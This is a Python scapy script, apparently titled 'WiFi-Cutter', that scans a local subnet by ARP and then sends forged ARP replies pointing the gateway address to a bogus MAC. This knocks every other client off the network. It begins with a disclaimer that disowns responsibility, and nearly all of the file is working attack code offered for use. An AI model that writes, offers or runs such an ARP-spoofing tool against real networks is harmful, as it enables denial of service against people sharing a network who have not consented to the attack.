from scapy.all import *
from time import sleep
from os import system
import random
loading=0
while loading<100:
    # animation = ["-","\\", "|","/"]
    # for i in animation:
    print("[ ! ] Program started, please wait ", str(loading), "%", end="\r")
    sleep(.1)
    loading += random.randint(0, 10)
# print("")
banner = '''
                             _    _ _______ _        _____       _   _            
                            | |  | (_)  ___(_)      /  __ \     | | | |           
                            | |  | |_| |_   _ ______| /  \/_   _| |_| |_ ___ _ __ 
                            | |/\| | |  _| | |______| |   | | | | __| __/ _ \ '__|
                            \  /\  / | |   | |      | \__/\ |_| | |_| ||  __/ |   
                             \/  \/|_\_|   |_|       \____/\__,_|\__|\__\___|_|   
                                                                                V2023.0
                                Coded By WanZ
'''
def shutdown():
    system('cls')
    print(banner)
    print("[ ! ] Program shutted down")
    exit()

sleep(1)
print("[ ! ] Using this by your own responsibility.\n[ ! ] Developer (Muhammad Najwan) didn't responsible for any problem you will cause.")
understand = input("[ ? ] Are you understand? (y-yes / n-no) : ")
if understand != "y":
    shutdown()
system('cls')

print(banner)
gateway = input("Enter gateway >> ")



packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="{}/24".format(gateway))
result = srp(packet, timeout=3, verbose=0)[0]

client_ip = []
client_mac = []

for sent, received in result:
    if (str(received.psrc) != get_if_addr(conf.iface)):
        client_ip.append(received.psrc)
        client_mac.append(received.hwsrc)


def cut(target_ip, target_mac):
    packet = ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=target_ip, hwdst=target_mac)
    send(packet, verbose=0)


print("---------------")
print("[ * ] {}   {}  --> Gateway".format(client_ip[0],client_mac[0]))
print("[ * ] {}   {}  --> This device".format(get_if_addr(conf.iface),get_if_hwaddr(conf.iface)))
print("---------------")

print("All client(s): ")
bill = 0;
for i in range(len(client_ip)):
    if i != 0:
        print("[ * ] {}   {}".format( client_ip[i], client_mac[i]))
        
input("[ ? ] Press Enter to start")
system('cls')
print(banner)

for i in range(len(client_ip)):
    if i != 0:
        cut(client_ip[i], client_mac[i])

while True:
    try:
        animation = ["-","\\", "|","/"]
        for i in animation:
            print("[ + ] Cutting . . . ", i, end="\r")
            sleep(.1)
    except KeyboardInterrupt:
        break


    